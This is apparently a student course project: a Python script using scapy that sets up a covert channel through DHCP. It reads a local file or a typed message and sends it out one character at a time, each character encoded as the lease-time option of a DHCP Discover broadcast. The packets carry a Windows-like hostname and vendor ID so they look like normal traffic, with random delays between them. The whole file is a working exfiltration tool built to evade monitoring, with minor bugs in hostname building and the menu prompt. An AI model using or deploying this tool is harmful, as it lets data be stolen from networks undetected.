#!/usr/bin/env python3
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.sendrecv import sendp
from scapy.arch import get_if_hwaddr
import random
import os
import time

DELAY_FACTOR = 0 #multiplier for delay values
XID = random.randint(1, 0xFFFFFFFF) #transaction ID
HOSTNAME = 'DESKTOP-'.join(str(random.randint(0, 9)) for _ in range(6))
VENDOR_CLASS_ID = "MSFT 5.0"

def mac_to_chaddr(mac: str) -> bytes:
    """
    Convert 'aa:bb:cc:dd:ee:ff' to BOOTP chaddr format (16 bytes, zero-padded).
    """
    # Remove colons and convert to bytes
    mac_bytes = bytes.fromhex(mac.replace(":", ""))
    # chaddr field is 16 bytes long in BOOTP
    return mac_bytes + b"\x00" * (16 - len(mac_bytes))

def send_dhcp_discover(lease_time_seconds: int, iface: str, src_mac = None):
    """
    Send a DHCP Discover packet requesting a specific lease time.

    :param lease_time_seconds: requested lease time in seconds (int)
    :param iface: network interface to send on (e.g. "eth0")
    :param src_mac: optional source MAC to use; if None we attempt to read from iface
    """
    if src_mac is None:
        try:
            src_mac = get_if_hwaddr(iface)
        except Exception as e:
            raise RuntimeError(
                "Could not determine interface MAC address; pass src_mac explicitly."
            ) from e

    chaddr = mac_to_chaddr(src_mac)

    # Build packet
    pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=0,
              htype=1,
              hlen=6,
              hops=0,
              xid=XID,
              secs=0,
              flags=(0x8000),
              ciaddr="0.0.0.0",
              yiaddr="0.0.0.0",
              chaddr=chaddr,
              sname="",
              file="",
              ) /
        DHCP(
            options=[
                ("message-type", 1),
                ("client-id", chaddr),
                ("hostname", HOSTNAME),
                ("vendor_class_id", VENDOR_CLASS_ID),
                # DHCP option 51: IP Address Lease Time (seconds)
                ("lease_time", lease_time_seconds),
                # common parameter request list
                ("param_req_list", [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
                "end",
            ]
        )
    )

    # print(f"[*] Sending DHCP Discover on iface={iface}, src_mac={src_mac}, requested_lease={lease_time_seconds}s")
    sendp(pkt, iface=iface, verbose=False)
    # print("[+] Packet sent.")

def send_text(message: str, interface, mac) -> None:
    # send init message
    send_dhcp_discover(0, interface, src_mac=mac)
    for char in message:
        send_dhcp_discover(ord(char), interface, src_mac=mac)
        time.sleep(random.randint(1,100)*DELAY_FACTOR*0.001)
    send_dhcp_discover(0, interface, src_mac=mac)

def send_file(local_filename: str, interface: str, mac) -> None:
    content = ""
    with open(local_filename) as file:
        content = file.read()
    send_dhcp_discover(1, interface, mac)
    for char in content:
        send_dhcp_discover(ord(char), interface, src_mac=mac)
        time.sleep(random.randint(1,100)*DELAY_FACTOR)
    send_dhcp_discover(1, interface, mac)

if __name__ == "__main__":
    if os.geteuid() != 0:
        exit("ERROR: you are not root. This script requires root privileges.")
    interface = "eth0"
    mac = None
    print(r""" ____  _   _  ___  ____     ___  _____  _  _  ____  ____  ____     ___  _   _    __    _  _  _  _  ____  __   
(  _ \( )_( )/ __)(  _ \   / __)(  _  )( \/ )( ___)(  _ \(_  _)   / __)( )_( )  /__\  ( \( )( \( )( ___)(  )  
 )(_) )) _ (( (__  )___/  ( (__  )(_)(  \  /  )__)  )   /  )(    ( (__  ) _ (  /(__)\  )  (  )  (  )__)  )(__ 
(____/(_) (_)\___)(__)     \___)(_____)  \/  (____)(_)\_) (__)    \___)(_) (_)(__)(__)(_)\_)(_)\_)(____)(____)""")
    print()
    
    exit_repl = False
    while not exit_repl:
        print(f"OPTIONS:\n[1] send a simple text message\n[2] send a file\n[3] change delay factor (currently {DELAY_FACTOR})\n[4] credits\n[5] exit")
        user_choice = ""
        try:
            user_choice = int(input("Enter a number 1-4: "))
        except ValueError:
            print("Invalid option.")
            continue
        match user_choice:
            case 1:
                message = input("enter a message to send: ")
                send_text(message, interface, mac)
                print("sent message successfully!")
            
            case 2: 
                filename = input("enter full filename:")
                send_file(filename, interface, mac)
                
            case 3:
                try:
                    DELAY_FACTOR = int(input("Enter new delay factor (int >=1): "))
                except ValueError:
                    print("Invalid delay factor.")
                    continue
                
            case 4:
                print("Created for CSEC-750 (Covert Comms) at RIT in Fall 2025 by:\nCayden Wright\nEric Antonecchia\nKelly Orjiude\nChris Baudouin")
                
            case 5:
                print("Goodbye!")
                exit_repl = True
            
            case _:
                print("Invalid option.")
                